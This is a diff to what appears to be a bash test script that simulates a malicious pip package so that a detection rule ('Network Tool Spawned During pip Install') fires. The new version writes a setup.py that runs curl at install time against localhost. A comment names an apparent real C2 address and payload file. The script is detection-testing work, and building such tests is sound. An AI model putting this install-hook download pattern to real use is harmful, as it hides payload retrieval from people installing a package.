@@ -57,29 +57,32 @@ sleep 1
 
 # =============================================================================
 # Stage 2: Network Tool Spawned During pip Install
-# Simulates the malicious package calling back to C2 during import.
-# We invoke curl as a child of python3 (mimicking import-time execution).
+# Installs a local dummy package whose setup.py spawns curl at install time.
+# This gives pip the correct process ancestry: pip3 → python3 → curl.
 # SAFE: target is localhost:9999 (unreachable).
 # Expected rule: TeamPCP - Network Tool Spawned During pip Install (WARNING)
 # =============================================================================
-echo -e "${BOLD}=== Stage 2: C2 Callback During Package Import ===${RESET}"
-echo "Simulating: malicious package spawns curl to deliver second-stage payload"
+echo -e "${BOLD}=== Stage 2: C2 Callback During pip Install ===${RESET}"
+echo "Simulating: malicious setup.py spawns curl during pip install"
 echo "SAFE: target is localhost:9999 (no real C2 contacted)"
 echo ""
 
-python3 -c "
-import subprocess, sys
+PKGDIR=$(mktemp -d)
+mkdir -p "$PKGDIR/evil_sim"
+touch "$PKGDIR/evil_sim/__init__.py"
+cat > "$PKGDIR/setup.py" << 'PYEOF'
+import subprocess, setuptools
 # Simulate WAV steganography download (ringtone.wav from 83.142.209.203:8080)
-# SAFE: targeting localhost
-result = subprocess.run(
-    ['curl', '-sf', '--max-time', '2', 'http://127.0.0.1:9999/ringtone.wav'],
-    capture_output=True
-)
-" 2>/dev/null || true
+subprocess.run(['curl', '-sf', '--max-time', '2', 'http://127.0.0.1:9999/ringtone.wav'],
+               capture_output=True)
+setuptools.setup(name='evil-sim-pkg', packages=['evil_sim'])
+PYEOF
+
+pip3 install "$PKGDIR/" --quiet --no-deps --no-build-isolation 2>/dev/null || true
+pip3 uninstall evil-sim-pkg -y --quiet 2>/dev/null || true
+rm -rf "$PKGDIR"
 
 echo -e "${YELLOW}Expected rule: TeamPCP - Network Tool Spawned During pip Install (WARNING)${RESET}"
-echo "Note: rule fires when pip is ancestor — use pip install of a local package"
-echo "      to trigger with full process tree in production environment"
 echo ""
 sleep 1
 
